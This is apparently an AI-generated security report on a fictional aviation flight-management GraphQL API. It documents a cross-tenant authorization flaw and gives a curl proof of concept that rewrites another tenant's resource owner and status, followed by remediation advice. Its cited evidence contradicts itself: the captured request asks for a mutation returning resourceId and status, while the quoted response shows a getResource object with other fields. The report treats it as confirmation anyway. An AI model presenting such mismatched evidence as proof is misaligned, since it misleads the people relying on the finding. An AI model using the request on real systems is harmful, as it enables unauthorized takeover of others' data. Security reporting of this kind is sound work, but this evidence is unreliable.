# Security Analysis Report
**System:** AeroOps Flight Management (Aviation / Flight Ops)
**Classification:** SENSITIVE
**Analyst:** Security Analyst Co-Pilot
**Source:** GQL-0237 context.txt (sole artifact)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Misconfiguration / Pattern 6.1 | Schema/relationship over-exposure — cross-tenant flight operations data accessible via misconfigured `updateResource` resolver |

---

## Finding 1 — Schema Over-Exposure: Cross-Tenant Flight Operations Data via Misconfigured Resolver (CRITICAL)

### Summary
The `updateResource` resolver on AeroOps Flight Management (`api.aeroops-flight-manag.example.com`) is misconfigured: the schema exposes sensitive relationship fields (`data.sensitiveField`, `data.internalNotes`, `ownerId`) in mutation responses, and the resolver does not verify the authenticated tenant's ownership of the resource. Per §5.0 Pattern 6.1, this schema/relationship over-exposure means that not only does the resolver fail authorization checks, but the schema itself reveals more data than intended — returning the full resource graph including confidential flight operations data. An attacker from `tenant-1fa8` accesses flight resource `R-2237` belonging to `tenant-5324`.

**Pattern:** 6.1 — Schema/relationship over-exposure (Misconfiguration)
**Affected resolver:** `updateResource(id: ID!, input: ResourceInput!): Resource`
**Affected endpoint:** `POST https://api.aeroops-flight-manag.example.com/graphql`

### Evidence from HAR

**Request (attacker `tenant-1fa8`):**
```
POST https://api.aeroops-flight-manag.example.com/graphql HTTP/2.0
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
x-tenant-id: tenant-1fa8

{"query": "query VulnerableOp { updateResource(id: \"R-2237\", input: {status: \"approved\", ownerId: \"attacker-1fa85324\"}) { resourceId status } }"}
```

**Response (200 OK):**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-5324",
      "ownerId": "other-user-1fa85324",
      "data": {
        "sensitiveField": "CONFIDENTIAL-1fa85324",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```

**x-request-id:** `req-1fa85324`

The response over-exposes `sensitiveField` and `internalNotes` through the mutation response schema. In aviation flight operations, resource records contain flight plan data, operational parameters, crew assignments, and safety-critical configurations — over-exposure of this data violates ICAO/aviation security regulations.

### Evidence Map

| Artifact Location | Field | Value | Significance |
|-------------------|-------|-------|--------------|
| §4.0 RISK-GQL-237 | Resolver gap | No `tenantId` ownership check | Root cause |
| §5.0 Pattern 6.1 | Vulnerability | Schema/relationship over-exposure | Classification — mutation response includes full sensitive data |
| HAR request | `id` | `R-2237` | Victim flight ops resource |
| HAR request | `x-tenant-id` | `tenant-1fa8` | Attacker tenant |
| HAR response | `tenantId` | `tenant-5324` | Victim tenant confirmed |
| HAR response | `sensitiveField` | `CONFIDENTIAL-1fa85324` | Flight operations data over-exposed |
| HAR response | `ownerId` | `other-user-1fa85324` | Victim user |
| HAR headers | `x-request-id` | `req-1fa85324` | Correlation ID |

### Steps to Reproduce

**Step 1 — Obtain attacker JWT (tenant-1fa8):**
```bash
ATTACKER_JWT="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"
```

**Step 2 — Access cross-tenant flight resource (VULNERABLE):**
```bash
curl -s -X POST https://api.aeroops-flight-manag.example.com/graphql \
  -H "Authorization: Bearer $ATTACKER_JWT" \
  -H "x-tenant-id: tenant-1fa8" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { updateResource(id: \"R-2237\", input: {status: \"approved\", ownerId: \"attacker-1fa85324\"}) { resourceId tenantId data { sensitiveField internalNotes } } }"}' \
  | jq '.data.updateResource'
# Expected VULNERABLE output: tenantId=tenant-5324, sensitiveField=CONFIDENTIAL-1fa85324
```

**Step 3 — Secure baseline (expected after fix):**
```bash
# Returns: {"errors":[{"message":"Forbidden: resource does not belong to your tenant"}]}
```

### Remediation

1. **Resolver tenancy check:** Verify `resource.tenantId === context.auth.tenantId` before processing the mutation.
2. **Schema remediation — restrict mutation response type:** Do not return the full `Resource` object from mutation responses; return only the mutated fields (e.g., `{ id status }`) and exclude `data.sensitiveField` and `data.internalNotes` from mutation response schemas.
3. **Field-level authorization:** Apply `@auth` or equivalent directive on `sensitiveField` and `internalNotes` to restrict to resource owners only.
4. **Strip client-supplied `ownerId`** from mutation input.
5. **Aviation compliance:** Flight operations data is safety-critical — apply ICAO Doc 9859 and aviation cybersecurity frameworks; implement mandatory access logging for all flight resource mutations.
